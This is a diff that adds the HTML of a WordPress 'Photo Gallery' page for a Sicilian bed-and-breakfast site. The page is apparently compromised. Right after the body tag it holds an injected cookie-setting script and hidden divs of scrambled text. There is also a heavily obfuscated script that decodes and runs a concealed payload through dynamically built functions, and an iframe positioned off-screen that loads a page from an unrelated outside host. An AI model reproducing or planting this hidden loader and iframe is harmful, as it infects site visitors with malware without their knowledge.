@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
+ <head profile="http://gmpg.org/xfn/11">
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <meta content="width=device-width" name="viewport" />
+  <title>
+   Photo Gallery
+  </title>
+  <meta content="" name="Description" />
+  <meta content="Photo,Gallery" name="Keywords" />
+  <link href="http://bnbminiatura.net/feed/" title="B&B Sicilia In Miniatura » Feed" type="application/rss+xml" rel="alternate" />
+  <link href="http://bnbminiatura.net/comments/feed/" title="B&B Sicilia In Miniatura » Comments Feed" type="application/rss+xml" rel="alternate" />
+  <link href="http://bnbminiatura.net/photo-gallery/feed/" title="B&B Sicilia In Miniatura » Photo Gallery Comments Feed" type="application/rss+xml" rel="alternate" />
+  <script src="https://apis.google.com/_/scs/apps-static/_/js/k=oz.gapi.it.aCXbJZfqGQQ.O/m=auth/exm=plusone/rt=j/sv=1/d=1/ed=1/am=AQ/rs=AGLTcCP5Saai5YGV2NdbtCHaQRhq7XNyqA/t=zcms/cb=gapi.loaded_1" async="" style="">
+  </script>
+  <script src="https://apis.google.com/_/scs/apps-static/_/js/k=oz.gapi.it.aCXbJZfqGQQ.O/m=plusone/rt=j/sv=1/d=1/ed=1/am=AQ/rs=AGLTcCP5Saai5YGV2NdbtCHaQRhq7XNyqA/t=zcms/cb=gapi.loaded_0" async="">
+  </script>
+  <script type="text/javascript" async="" src="https://apis.google.com/js/plusone.js" gapi_processed="true">
+  </script>
+  <script id="twitter-wjs" src="//platform.twitter.com/widgets.js">
+  </script>
+  <script type="text/javascript">
+   window._wpemojiSettings = {"baseUrl":"http:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/bnbminiatura.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.2.5"}};
+			!function(a,b,c){function d(a){var c=b.createElement("canvas"),d=c.getContext&amp;&amp;c.getContext("2d");return d&amp;&amp;d.fillText?(d.textBaseline="top",d.font="600 32px Arial","flag"===a?(d.fillText(String.fromCharCode(55356,56812,55356,56807),0,0),c.toDataURL().length&gt;3e3):(d.fillText(String.fromCharCode(55357,56835),0,0),0!==d.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&amp;&amp;c.supports.flag||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&amp;&amp;c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&amp;&amp;f.twemoji&amp;&amp;(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+  </script>
+  <script src="http://bnbminiatura.net/wp-includes/js/wp-emoji-release.min.js?ver=4.2.5" type="text/javascript">
+  </script>
+  <style type="text/css">
+   img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+  </style>
+  <link media="all" type="text/css" href="http://bnbminiatura.net/wp-content/plugins/gallery-bank/assets/css/gallery-bank.css?ver=4.2.5" id="gallery-bank.css-css" rel="stylesheet" />
+  <link media="all" type="text/css" href="http://bnbminiatura.net/wp-content/plugins/gallery-bank/assets/css/prettyPhoto.css?ver=4.2.5" id="prettyPhoto.css-css" rel="stylesheet" />
+  <link media="all" type="text/css" href="http://bnbminiatura.net/wp-content/themes/bower/css/index.css?ver=4.2.5" id="index-css" rel="stylesheet" />
+  <link media="all" type="text/css" href="http://bnbminiatura.net/wp-content/themes/bower/style.css?ver=4.2.5" id="style-css" rel="stylesheet" />
+  <script src="http://bnbminiatura.net/wp-includes/js/jquery/jquery.js?ver=1.11.2" type="text/javascript">
+  </script>
+  <script src="http://bnbminiatura.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1" type="text/javascript">
+  </script>
+  <script src="http://bnbminiatura.net/wp-content/plugins/gallery-bank/assets/js/jquery.masonry.min.js?ver=4.2.5" type="text/javascript">
+  </script>
+  <script src="http://bnbminiatura.net/wp-content/plugins/gallery-bank/assets/js/isotope.pkgd.js?ver=4.2.5" type="text/javascript">
+  </script>
+  <script src="http://bnbminiatura.net/wp-content/plugins/gallery-bank/assets/js/imgLiquid.js?ver=4.2.5" type="text/javascript">
+  </script>
+  <style type="text/css">
+   .imgLiquid img {visibility:hidden}
+  </style>
+  <script src="http://bnbminiatura.net/wp-content/plugins/gallery-bank/assets/js/jquery.prettyPhoto.js?ver=4.2.5" type="text/javascript">
+  </script>
+  <script src="https://maps.google.com/maps/api/js?sensor=false&ver=3" type="text/javascript">
+  </script>
+  <link href="http://bnbminiatura.net/xmlrpc.php?rsd" title="RSD" type="application/rsd+xml" rel="EditURI" />
+  <link href="http://bnbminiatura.net/wp-includes/wlwmanifest.xml" type="application/wlwmanifest+xml" rel="wlwmanifest" />
+  <meta content="WordPress 4.2.5" name="generator" />
+  <link href="http://bnbminiatura.net/photo-gallery/" rel="canonical" />
+  <link href="http://bnbminiatura.net/?p=12" rel="shortlink" />
+  <link type="image/x-icon" href="http://bnbminiatura.net/wp-content/themes/bower/images/favicon.png" rel="shortcut icon" />
+  <script src="http://bnbminiatura.net/wp-content/themes/bower/js/dpagination.js" type="text/javascript">
+  </script>
+  <link media="screen and (min-width:1024px)" type="text/css" href="http://bnbminiatura.net/wp-content/themes/bower/css/wide.css" rel="stylesheet" />
+  <!--[if lt IE 9]>
+				<link rel="stylesheet" href="http://bnbminiatura.net/wp-content/themes/bower/css/wide.css" type="text/css" media="screen"  />
+				<link rel="stylesheet" href="http://bnbminiatura.net/wp-content/themes/bower/css/ie.css" type="text/css" media="screen"  />
+				<![endif]-->
+  <link media="screen and (min-width:240px) and (max-width:639px)" type="text/css" href="http://bnbminiatura.net/wp-content/themes/bower/css/mobile.css" rel="stylesheet" />
+  <link media="screen and (min-width:640px) and (max-width:1023px)" type="text/css" href="http://bnbminiatura.net/wp-content/themes/bower/css/tablet.css" rel="stylesheet" />
+  <link media="screen, projection" type="text/css" href="http://bnbminiatura.net/wp-content/themes/bower/css/shortcode.css" rel="stylesheet" />
+  <script src="http://bnbminiatura.net/wp-content/themes/bower/js/superfish.js?ver=3.3.1" type="text/javascript">
+  </script>
+  <script src="http://bnbminiatura.net/wp-content/themes/bower/js/smthemes.js?ver=724" type="text/javascript">
+  </script>
+  <script type="text/javascript" src="http://bnbminiatura.net/wp-content/themes/bower/js/jquery.cycle.all.js">
+  </script>
+  <script type="text/javascript">
+   jQuery(document).ready(function() {
+
+								jQuery(document).ready(function() {
+	jQuery('.fp-slides').cycle({
+		fx: 'fade',
+		timeout: 3000,
+		delay: 0,
+		speed: 1000,
+		next: '.fp-next',
+		prev: '.fp-prev',
+		pager: '.fp-pager',
+		continuous: 0,
+		sync: 1,
+		pause: 1000,
+		pauseOnPagerHover: 1,
+		cleartype: true,
+		cleartypeNoBg: true
+	});
+ });
+								jQuery(".menus .children").addClass('sub-menu');
+									if ( jQuery(document).width() &gt; 1023 ) jQuery(function(){ 
+	jQuery('ul.menus').superfish({ 
+	animation: {width:'show'},					
+								autoArrows:  false,
+                dropShadows: false, 
+                speed: 200,
+                delay: 800                });
+            });
+								jQuery('textarea#comment').each(function(){
+						jQuery(this).attr('name','04322');
+					});
+				});
+  </script>
+  <style type="text/css">
+  </style>
+  <script type="text/javascript" charset="utf-8" async="" src="https://platform.twitter.com/js/button.62c90500b68fa929c850cfa2c5dcb03f.js">
+  </script>
+  <script type="text/javascript" charset="UTF-8" src="https://maps.google.com/maps-api-v3/api/js/22/12a/common.js">
+  </script>
+  <script type="text/javascript" charset="UTF-8" src="https://maps.google.com/maps-api-v3/api/js/22/12a/util.js">
+  </script>
+  <script type="text/javascript" charset="UTF-8" src="https://maps.google.com/maps-api-v3/api/js/22/12a/stats.js">
+  </script>
+  <script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps/api/js/AuthenticationService.Authenticate?1shttp%3A%2F%2Fbnbminiatura.net%2Fphoto-gallery%2F&callback=_xdc_._45mbdf&token=108877">
+  </script>
+ </head>
+ <body layout="2" class="page page-id-12 page-template-default  content-r">
+  <script>
+   var date = new Date(new Date().getTime() + 60*60*24*7*1000); document.cookie="PHP_SESSION_PHP=3; path=/; expires="+date.toUTCString();
+  </script>
+  <div style="display:none" id="isctycxrfv">
+   a n chavapapatapbucxa 39 cco aab gatdec rcwa sbubca zdhdje, sa hbcakata u caaiapcpal bm a taaa 5 hanarcbaw bccq aachayc m. a daua sc baj aacqam e, ha! cavasc ycydvdpczcma, rehabat ag a, caj d sdi craaazbsc. zasahbfagbyardbad dldwa, gacdlaldpenawabc v afbxcuc sagbfa xesagazddb abncxd kataqajcla q b bdpatbnaua iahama; e eq d ncvdlapbma, xaxahdiasboagcua, sabbgacak dkd l d a e dagb ddda fclataicyau asc. bajaa cq. a: achayajaxafaaemagbadpcs ccazbbaqa, sasenatbcdh 'bebyaz' aiax bb dbbqana fapapebc maydhcnct bpamarand m. ducoazdhdkdeea dgcrcp badtb bcvagcmcpes a sbcdgbd cicxdkdc cpddeqcrbddha abz beao drdgd f ehdhdja od h etb fbcaq ax a mc ldncvb. fancja acqcrdrdm
+  </div>
+  <div style="display:none" id="haihquctmedextd">
+   iTvzbvaZeu0
+  </div>
+  <script>
+   var haihquctmedextd="haihquctmedextd";
+var frmarttvgkcldzmph="\"";
+var qmuprnebfrv="qmuprnebfrv";
+var lbjpjaunozuosm=0;
+function qfycfblhgxu(haihquctmedextd,isctycxrfv){return new Function(haihquctmedextd,isctycxrfv)}
+var isctycxrfv="isctycxrfv";
+var mfkxckcqzsyk=3;
+function rwlnalxpiphwboo(haihquctmedextd,isctycxrfv,qmuprnebfrv){return new Function(haihquctmedextd,isctycxrfv,qmuprnebfrv)}
+try {
+var vdwvnfmvivcijk="%qitr)mdex-*EljoenmgfhnaCIsucinyp!rvhasdcoASlvis+cj^b[qd(g lmlupMLqlHTbv:kdsd]x=ocetkOfae12&lt;jlByky&amp;ul.uj";
+    new ActiveXObject(vdwvnfmvivcijk);
+    lbjpjaunozuosm=mfkxckcqzsyk; }
+catch (e) {
+    mfkxckcqzsyk=lbjpjaunozuosm+1;
+}
+
+function jrzigbmijwwx(haihquctmedextd, isctycxrfv)
+{
+    return haihquctmedextd.charAt(isctycxrfv);
+}
+var fbmxvbiewdc=jrzigbmijwwx(vdwvnfmvivcijk,79);
+var dzkitaqoptcpt=jrzigbmijwwx(vdwvnfmvivcijk,7)+jrzigbmijwwx(vdwvnfmvivcijk,8)+jrzigbmijwwx(vdwvnfmvivcijk,9);
+var xdhbvxznuegbf=jrzigbmijwwx(vdwvnfmvivcijk,48);
+var rpvfjudhdyemkn=jrzigbmijwwx(vdwvnfmvivcijk,27)+jrzigbmijwwx(vdwvnfmvivcijk,28);
+var yvheuanihjya=jrzigbmijwwx(vdwvnfmvivcijk,3)+jrzigbmijwwx(vdwvnfmvivcijk,4);
+var wirlxjyowuz=jrzigbmijwwx(vdwvnfmvivcijk,77);
+var sqbetvmqbvhnwp=jrzigbmijwwx(vdwvnfmvivcijk,42)+jrzigbmijwwx(vdwvnfmvivcijk,43);
+var xdqvjqqauth=jrzigbmijwwx(vdwvnfmvivcijk,58);
+var tnsfcfjaiawbsgie=jrzigbmijwwx(vdwvnfmvivcijk,64)+jrzigbmijwwx(vdwvnfmvivcijk,65);
+
+var msygroyowdyt=jrzigbmijwwx(vdwvnfmvivcijk,53);
+var sockcwzaywdg=jrzigbmijwwx(vdwvnfmvivcijk,85)+jrzigbmijwwx(vdwvnfmvivcijk,86);
+var ucwyrdeqkrhetu=jrzigbmijwwx(vdwvnfmvivcijk,33);
+var hxvbyquuqiriy=jrzigbmijwwx(vdwvnfmvivcijk,36)+jrzigbmijwwx(vdwvnfmvivcijk,37);
+var ycqtlbeffkduq=jrzigbmijwwx(vdwvnfmvivcijk,91);
+var pzxzgepsfdcp=jrzigbmijwwx(vdwvnfmvivcijk,94)+jrzigbmijwwx(vdwvnfmvivcijk,95);
+var cscaqmdqsmqkiwiq=jrzigbmijwwx(vdwvnfmvivcijk,10);
+var gbkctzylmhiun=jrzigbmijwwx(vdwvnfmvivcijk,16)+jrzigbmijwwx(vdwvnfmvivcijk,17);
+var jjcmhpzausmc=jrzigbmijwwx(vdwvnfmvivcijk,60)+jrzigbmijwwx(vdwvnfmvivcijk,61);
+var fglkyoqwgno=jrzigbmijwwx(vdwvnfmvivcijk,19)+jrzigbmijwwx(vdwvnfmvivcijk,20);
+var rgimiuqibsl=jrzigbmijwwx(vdwvnfmvivcijk,51);
+var kqxopkaziymduh=jrzigbmijwwx(vdwvnfmvivcijk,12)+jrzigbmijwwx(vdwvnfmvivcijk,13);
+var vaeurngpliig=jrzigbmijwwx(vdwvnfmvivcijk,29)+jrzigbmijwwx(vdwvnfmvivcijk,30);
+var uircvikkgryag=jrzigbmijwwx(vdwvnfmvivcijk,101);
+var bnymvoxlwwd=jrzigbmijwwx(vdwvnfmvivcijk,98);
+var pptkztvogkxytylvno=jrzigbmijwwx(vdwvnfmvivcijk,5);
+var vfjmubygocvigfihx=jrzigbmijwwx(vdwvnfmvivcijk,68)+jrzigbmijwwx(vdwvnfmvivcijk,69);
+var ftckayshpyxzyaxp=jrzigbmijwwx(vdwvnfmvivcijk,75)+jrzigbmijwwx(vdwvnfmvivcijk,76);
+var qycsuwtibawq=jrzigbmijwwx(vdwvnfmvivcijk,56);
+var jssnfjkbcaqk=jrzigbmijwwx(vdwvnfmvivcijk,24)+jrzigbmijwwx(vdwvnfmvivcijk,25);
+var vspxgafvdpbm=jrzigbmijwwx(vdwvnfmvivcijk,99)+jrzigbmijwwx(vdwvnfmvivcijk,100);
+var kevszvqvlnyudv=jrzigbmijwwx(vdwvnfmvivcijk,82)+jrzigbmijwwx(vdwvnfmvivcijk,83);
+var ojwtepuqsvtqd=jrzigbmijwwx(vdwvnfmvivcijk,0);
+var fpjufyabovlr=jrzigbmijwwx(vdwvnfmvivcijk,71)+jrzigbmijwwx(vdwvnfmvivcijk,72);
+var nvhlviiayvado=jrzigbmijwwx(vdwvnfmvivcijk,89)+jrzigbmijwwx(vdwvnfmvivcijk,90);
+var siyodukvplc=jrzigbmijwwx(vdwvnfmvivcijk,11);
+var vaspkqnxbvykbrny=jrzigbmijwwx(vdwvnfmvivcijk,45)+jrzigbmijwwx(vdwvnfmvivcijk,46);
+var jrdcifjglqwf=jrzigbmijwwx(vdwvnfmvivcijk,40)+jrzigbmijwwx(vdwvnfmvivcijk,41);
+var oixyxpmiddvcgbw=jrzigbmijwwx(fglkyoqwgno,lbjpjaunozuosm);
+var gzvduyyfdmdxmvd=jrzigbmijwwx(yvheuanihjya, mfkxckcqzsyk);
+var zoqapukhcuc=jrzigbmijwwx(jrdcifjglqwf,lbjpjaunozuosm);
+var ktdhzltysshmznq=jrzigbmijwwx(jssnfjkbcaqk,lbjpjaunozuosm);
+var zhqjvrcfkdzf=!![];
+var ylrycvtxvrxgxf=jrzigbmijwwx(jjcmhpzausmc,mfkxckcqzsyk)+gbkctzylmhiun+jrzigbmijwwx(fglkyoqwgno,lbjpjaunozuosm)+jrzigbmijwwx(yvheuanihjya,lbjpjaunozuosm)+jrzigbmijwwx(hxvbyquuqiriy,lbjpjaunozuosm);
+var kwqowlnomvdz=jrzigbmijwwx(sqbetvmqbvhnwp,mfkxckcqzsyk)+yvheuanihjya+vaeurngpliig+oixyxpmiddvcgbw;
+var tfndupemssmsmt=jrzigbmijwwx(ftckayshpyxzyaxp,mfkxckcqzsyk)+jrzigbmijwwx(jrdcifjglqwf,mfkxckcqzsyk)+jrzigbmijwwx(rpvfjudhdyemkn,mfkxckcqzsyk)+jrzigbmijwwx(rpvfjudhdyemkn,lbjpjaunozuosm)+jrzigbmijwwx(jjcmhpzausmc,lbjpjaunozuosm)+gbkctzylmhiun+jrzigbmijwwx(yvheuanihjya,lbjpjaunozuosm)+uircvikkgryag+oixyxpmiddvcgbw+kevszvqvlnyudv+kqxopkaziymduh+jrzigbmijwwx(gbkctzylmhiun,lbjpjaunozuosm)+jrzigbmijwwx(jjcmhpzausmc,lbjpjaunozuosm)+gbkctzylmhiun+jrzigbmijwwx(yvheuanihjya,lbjpjaunozuosm)+pzxzgepsfdcp+jrzigbmijwwx(jssnfjkbcaqk,mfkxckcqzsyk)+jrzigbmijwwx(ftckayshpyxzyaxp,mfkxckcqzsyk);
+var qvfynnlhmkkvi=hxvbyquuqiriy+jrzigbmijwwx(yvheuanihjya,mfkxckcqzsyk)+ktdhzltysshmznq+jrzigbmijwwx(jrdcifjglqwf,mfkxckcqzsyk)+jrzigbmijwwx(ftckayshpyxzyaxp,mfkxckcqzsyk)+jrzigbmijwwx(gbkctzylmhiun,lbjpjaunozuosm);
+var noesynkeymeq=gzvduyyfdmdxmvd+kevszvqvlnyudv+jrzigbmijwwx(vspxgafvdpbm,lbjpjaunozuosm)+jrzigbmijwwx(yvheuanihjya,mfkxckcqzsyk)+jrzigbmijwwx(gbkctzylmhiun,mfkxckcqzsyk);
+var fobugfpveoqy=vaeurngpliig+jrzigbmijwwx(vaeurngpliig,mfkxckcqzsyk)+jrzigbmijwwx(gbkctzylmhiun,lbjpjaunozuosm)+jrzigbmijwwx(yvheuanihjya,mfkxckcqzsyk)+vfjmubygocvigfihx+tnsfcfjaiawbsgie;
+var knobllpxkgnobna=jrdcifjglqwf+jrzigbmijwwx(gbkctzylmhiun,mfkxckcqzsyk)+jrzigbmijwwx(ftckayshpyxzyaxp,lbjpjaunozuosm)+yvheuanihjya+rpvfjudhdyemkn+jrzigbmijwwx(yvheuanihjya,lbjpjaunozuosm)+jrzigbmijwwx(jrdcifjglqwf,mfkxckcqzsyk)+jrzigbmijwwx(yvheuanihjya,mfkxckcqzsyk);
+var jttgtdlgsrwaafv=jrzigbmijwwx(fglkyoqwgno,mfkxckcqzsyk)+jrzigbmijwwx(yvheuanihjya,mfkxckcqzsyk)+jrzigbmijwwx(jrdcifjglqwf,mfkxckcqzsyk)+jrzigbmijwwx(jjcmhpzausmc,lbjpjaunozuosm);
+var yznkjukzfkslc=jrzigbmijwwx(sqbetvmqbvhnwp,lbjpjaunozuosm)+jrzigbmijwwx(yvheuanihjya,lbjpjaunozuosm);
+var vkpbrxukbvac=qfycfblhgxu(haihquctmedextd,noesynkeymeq+xdqvjqqauth+haihquctmedextd+uircvikkgryag+ylrycvtxvrxgxf);
+var lumjflevwhi=new Function(haihquctmedextd,isctycxrfv,noesynkeymeq+xdqvjqqauth+haihquctmedextd+cscaqmdqsmqkiwiq+isctycxrfv);
+var vkpbrxukbvac=qfycfblhgxu(haihquctmedextd,noesynkeymeq+xdqvjqqauth+haihquctmedextd+uircvikkgryag+ylrycvtxvrxgxf);
+var yyxwjzyuiacsf=rwlnalxpiphwboo(haihquctmedextd,isctycxrfv,noesynkeymeq+xdqvjqqauth+haihquctmedextd+uircvikkgryag+zoqapukhcuc+qvfynnlhmkkvi+yznkjukzfkslc+qycsuwtibawq+isctycxrfv+pptkztvogkxytylvno);
+var rdkwvwbstg=rwlnalxpiphwboo(haihquctmedextd,isctycxrfv,noesynkeymeq+xdqvjqqauth+haihquctmedextd+xdhbvxznuegbf+isctycxrfv);
+var tmvexirrxelxu=qfycfblhgxu(isctycxrfv,noesynkeymeq+xdqvjqqauth+kwqowlnomvdz+uircvikkgryag+jttgtdlgsrwaafv+ktdhzltysshmznq+qvfynnlhmkkvi+qycsuwtibawq+isctycxrfv+pptkztvogkxytylvno);
+var lwhfodxzqbcb=rwlnalxpiphwboo(haihquctmedextd,isctycxrfv,noesynkeymeq+xdqvjqqauth+haihquctmedextd+uircvikkgryag+vaeurngpliig+dzkitaqoptcpt+sockcwzaywdg+qycsuwtibawq+isctycxrfv+pptkztvogkxytylvno);
+var ssdksrlqrwgp=rwlnalxpiphwboo(haihquctmedextd,isctycxrfv,noesynkeymeq+xdqvjqqauth+haihquctmedextd+ojwtepuqsvtqd+isctycxrfv);
+var efqpjliaioeq=rwlnalxpiphwboo(haihquctmedextd,isctycxrfv,noesynkeymeq+xdqvjqqauth+haihquctmedextd+rgimiuqibsl+isctycxrfv);
+var zssofflzmg=qfycfblhgxu(haihquctmedextd,noesynkeymeq+xdqvjqqauth+tfndupemssmsmt+qycsuwtibawq+haihquctmedextd+pptkztvogkxytylvno+uircvikkgryag+fobugfpveoqy);
+var sfobfuojwxmyy=qfycfblhgxu(haihquctmedextd,msygroyowdyt+wirlxjyowuz+msygroyowdyt+frmarttvgkcldzmph+knobllpxkgnobna+frmarttvgkcldzmph+wirlxjyowuz+msygroyowdyt+frmarttvgkcldzmph+knobllpxkgnobna+frmarttvgkcldzmph+wirlxjyowuz+qycsuwtibawq+haihquctmedextd+pptkztvogkxytylvno+qycsuwtibawq+pptkztvogkxytylvno);
+var vzbboczfzgzseu=zssofflzmg(isctycxrfv);
+var mmzfrpjyiwsfno=mfkxckcqzsyk;
+var rdqstjquivr=zssofflzmg(haihquctmedextd);
+var nxjbavuhjfwd=qfycfblhgxu(haihquctmedextd,noesynkeymeq+xdqvjqqauth+ucwyrdeqkrhetu+haihquctmedextd);
+var grhwzwdeivxh=lbjpjaunozuosm;
+var ymgrkumphukidxs=rwlnalxpiphwboo(haihquctmedextd,isctycxrfv,noesynkeymeq+xdqvjqqauth+haihquctmedextd+ycqtlbeffkduq+isctycxrfv);
+var jbaphlqbucvxtk=rwlnalxpiphwboo(haihquctmedextd,isctycxrfv,noesynkeymeq+xdqvjqqauth+haihquctmedextd+ycqtlbeffkduq+fbmxvbiewdc+isctycxrfv);
+var ftmltlvojegidf=lbjpjaunozuosm;
+var zhzqaobpgmbcrwv=rwlnalxpiphwboo(haihquctmedextd,isctycxrfv,noesynkeymeq+xdqvjqqauth+haihquctmedextd+bnymvoxlwwd+bnymvoxlwwd+isctycxrfv);
+var twnchmfravfr="";
+var atxcdipmdz=rwlnalxpiphwboo(haihquctmedextd,isctycxrfv,noesynkeymeq+xdqvjqqauth+haihquctmedextd+siyodukvplc+isctycxrfv);
+var fymelfmjpzs;
+var ymuolsxovyameax=[gzvduyyfdmdxmvd+fpjufyabovlr+jrzigbmijwwx(nvhlviiayvado,lbjpjaunozuosm)+jrzigbmijwwx(nvhlviiayvado,lbjpjaunozuosm),jrzigbmijwwx(tnsfcfjaiawbsgie,lbjpjaunozuosm)+jrzigbmijwwx(sqbetvmqbvhnwp,mfkxckcqzsyk)+jrzigbmijwwx(jssnfjkbcaqk,mfkxckcqzsyk)+jrzigbmijwwx(kqxopkaziymduh,lbjpjaunozuosm),];
+var zswcivlhsiwvhak=vkpbrxukbvac(ymuolsxovyameax);
+safijbsypuwouoa=lbjpjaunozuosm;
+while (ymgrkumphukidxs(safijbsypuwouoa,zswcivlhsiwvhak))
+{
+    sfobfuojwxmyy("efdibausufb"+fbmxvbiewdc+jrzigbmijwwx(vaeurngpliig,mfkxckcqzsyk)+jrzigbmijwwx(hxvbyquuqiriy,mfkxckcqzsyk)+vaspkqnxbvykbrny+jrzigbmijwwx(fglkyoqwgno,lbjpjaunozuosm)+jrzigbmijwwx(hxvbyquuqiriy,mfkxckcqzsyk)+jrzigbmijwwx(kevszvqvlnyudv,mfkxckcqzsyk)+jrzigbmijwwx(jrdcifjglqwf,mfkxckcqzsyk)+jrzigbmijwwx(yvheuanihjya,mfkxckcqzsyk)+uircvikkgryag+jrzigbmijwwx(rpvfjudhdyemkn,lbjpjaunozuosm)+jrzigbmijwwx(ftckayshpyxzyaxp,lbjpjaunozuosm)+jrzigbmijwwx(gbkctzylmhiun,lbjpjaunozuosm)+jrzigbmijwwx(yvheuanihjya,mfkxckcqzsyk)+jrzigbmijwwx(sqbetvmqbvhnwp,lbjpjaunozuosm)+jrzigbmijwwx(fglkyoqwgno,lbjpjaunozuosm)+jrzigbmijwwx(kevszvqvlnyudv,lbjpjaunozuosm)+jrzigbmijwwx(vaeurngpliig,mfkxckcqzsyk)+jrzigbmijwwx(kevszvqvlnyudv,mfkxckcqzsyk));
+    if (ymgrkumphukidxs(lbjpjaunozuosm,lwhfodxzqbcb(efdibausufb,ymuolsxovyameax[safijbsypuwouoa])))
+    {
+        mmzfrpjyiwsfno=lumjflevwhi(zswcivlhsiwvhak, safijbsypuwouoa);
+        break;
+    }
+    safijbsypuwouoa++;
+}var kirtyonjkl = 12*mmzfrpjyiwsfno + 2;
+var krasoicmsikg = 23*mmzfrpjyiwsfno + 76;
+var fjxyllwzcq = 14*mmzfrpjyiwsfno + 69;
+
+var qjelximlzdcwq = 22*mmzfrpjyiwsfno + 211;
+safijbsypuwouoa=lbjpjaunozuosm;
+while (zhqjvrcfkdzf)
+{
+    if (safijbsypuwouoa == vkpbrxukbvac(vzbboczfzgzseu)) { break; }
+    var zswcivlhsiwvhak=yyxwjzyuiacsf(vzbboczfzgzseu, safijbsypuwouoa);
+    if (zhzqaobpgmbcrwv(jbaphlqbucvxtk(fjxyllwzcq, zswcivlhsiwvhak), jbaphlqbucvxtk(zswcivlhsiwvhak, krasoicmsikg)))
+    {
+        if (ssdksrlqrwgp(grhwzwdeivxh, mmzfrpjyiwsfno))
+        {
+            twnchmfravfr=rdkwvwbstg(twnchmfravfr, tmvexirrxelxu(ssdksrlqrwgp((efqpjliaioeq(rdkwvwbstg(fymelfmjpzs, lumjflevwhi(zswcivlhsiwvhak, fjxyllwzcq)), yyxwjzyuiacsf(rdqstjquivr, ssdksrlqrwgp(ftmltlvojegidf, vkpbrxukbvac(rdqstjquivr))))), qjelximlzdcwq)));
+            ftmltlvojegidf=rdkwvwbstg(ftmltlvojegidf, mfkxckcqzsyk);
+        }
+        else
+        {
+            fymelfmjpzs=atxcdipmdz(kirtyonjkl, lumjflevwhi(zswcivlhsiwvhak, fjxyllwzcq));
+        }
+        grhwzwdeivxh=rdkwvwbstg(grhwzwdeivxh, mfkxckcqzsyk);
+    }
+    safijbsypuwouoa=rdkwvwbstg(safijbsypuwouoa, mfkxckcqzsyk);
+}
+sfobfuojwxmyy(twnchmfravfr);
+  </script>
+  <style>
+   .qfheunmzsbreze{position:absolute;top:-988px;width:300px;height:300px;}
+  </style>
+  <div class="qfheunmzsbreze">
+   <iframe width="250" height="250" src="http://1chalker.bsolutionsusa.com/boards/viewforum.php?f=6b77&sid=364c7.3210ss5m3d6">
+   </iframe>
+  </div>
+  <div id="scrollUp">
+   <img title="Scroll window up" alt="Up" src="http://bnbminiatura.net/wp-content/themes/bower/images/smt/arrow-up.png" />
+  </div>
+  <div id="all">
+   <div id="header">
+    <div class="container clearfix">
+     <div id="secondarymenu-container">
+      <div id="logo">
+       <h1 class="site_ttl">
+        B&amp;B Sicilia In Miniatura
+       </h1>
+      </div>
+      <div id="menu-box">
+       <div id="secondarymenu">
+       </div>
+      </div>
+      <div class="clear">
+      </div>
+      <div id="mainmenu-container">
+       <div id="mainmenu">
+        <div class="menu-topmenu-container">
+         <ul class="menus">
+          <li class="page_item page-item-2">
+           <a href="http://bnbminiatura.net/">
+            Home
+           </a>
+          </li>
+          <li class="page_item page-item-34">
+           <a href="http://bnbminiatura.net/nearest-from/">
+            Nearest From
+           </a>
+          </li>
+          <li class="page_item page-item-20">
+           <a href="http://bnbminiatura.net/prices-and-services/">
+            Prices and Services
+           </a>
+          </li>
+          <li class="page_item page-item-12 current_page_item">
+           <a href="http://bnbminiatura.net/photo-gallery/">
+            Photo Gallery
+           </a>
+          </li>
+          <li class="page_item page-item-15">
+           <a href="http://bnbminiatura.net/contact-us/">
+            Contact Us
+           </a>
+          </li>
+         </ul>
+        </div>
+       </div>
+      </div>
+     </div>
+     <select id="mobile-main-menu" class="mobile-menu">
+      <option value="#">
+       Go to ...
+      </option>
+      <script>
+       jQuery(document).ready(function(){
+				jQuery('.menu-primary li').each(function() {
+					jQuery('&lt;option /&gt;', {
+					'value':jQuery(this).find('a').attr('href'),
+					'text':jQuery(this).find('a').html()
+					}).appendTo(jQuery('#mobile-main-menu'));
+				});
+			});
+      </script>
+     </select>
+     <div id="header-block">
+      <div class="slider-container">
+       <div class="slider-bgr">
+       </div>
+       <div class="slider">
+        <div class="fp-slides" style="width: auto; height: auto;">
+         <div class="fp-slides-items fp-first" style="position: absolute; top: 0px; left: 0px; display: none; z-index: 5; opacity: 0; width: 100%; height: auto;">
+          <div class="fp-thumbnail">
+           <a title="" href="">
+            <img alt="" src="http://bnbminiatura.net/wp-content/themes/bower/images/slides/1.jpg" />
+           </a>
+          </div>
+          <div class="fp-content-wrap">
+           <div class="fp-content">
+            <h3 class="fp-title">
+             <a title="" href="">
+             </a>
+            </h3>
+            <p>
+             <a href="" class="fp-more">
+              Read More
+             </a>
+            </p>
+           </div>
+          </div>
+         </div>
+         <div class="fp-slides-items" style="position: absolute; top: 0px; left: 0px; display: none; z-index: 5; opacity: 0; width: 959px; height: 299px;">
+          <div class="fp-thumbnail">
+           <a title="" href="">
+            <img alt="" src="http://bnbminiatura.net/wp-content/themes/bower/images/slides/2.jpg" />
+           </a>
+          </div>
+          <div class="fp-content-wrap">
+           <div class="fp-content">
+            <h3 class="fp-title">
+             <a title="" href="">
+             </a>
+            </h3>
+            <p>
+             <a href="" class="fp-more">
+              Read More
+             </a>
+            </p>
+           </div>
+          </div>
+         </div>
